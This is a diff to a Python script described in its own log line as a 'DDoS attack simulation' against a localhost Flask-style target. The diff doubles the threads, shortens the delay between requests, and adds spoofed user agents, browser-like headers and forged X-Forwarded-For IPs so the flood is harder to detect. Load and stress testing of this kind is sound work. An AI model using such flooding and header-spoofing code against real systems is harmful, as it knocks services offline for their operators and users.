@@ -17,8 +17,10 @@ logging.basicConfig(
 )
 
 TARGET_URL = "http://127.0.0.1:5000/"
-NUM_THREADS = 50
+NUM_THREADS = 100  # Increased number of threads
 ATTACK_DURATION = 300  # 5 minutes
+MIN_DELAY = 0.01  # Minimum delay between requests (10ms)
+MAX_DELAY = 0.1   # Maximum delay between requests (100ms)
 
 # Initialize attack log CSV
 with open('attack_log.csv', 'w', newline='') as f:
@@ -30,6 +32,8 @@ def random_user_agent():
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
         "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
     ]
     return random.choice(user_agents)
 
@@ -53,7 +57,13 @@ def attack(thread_id):
             
             headers = {
                 "User-Agent": random_user_agent(),
-                "X-Forwarded-For": ip
+                "X-Forwarded-For": ip,
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Connection": "keep-alive",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
             }
             
             request_start = time.time()
@@ -67,8 +77,8 @@ def attack(thread_id):
             logging.error(f"Thread {thread_id} - Request failed: {str(e)}")
             log_attack(thread_id, ip, "ERROR", 0)
         
-        # Random delay between requests
-        time.sleep(random.uniform(0.1, 0.5))
+        # Random delay between requests (much shorter for more intense attack)
+        time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))
 
 def main():
     logging.info("Starting DDoS attack simulation")
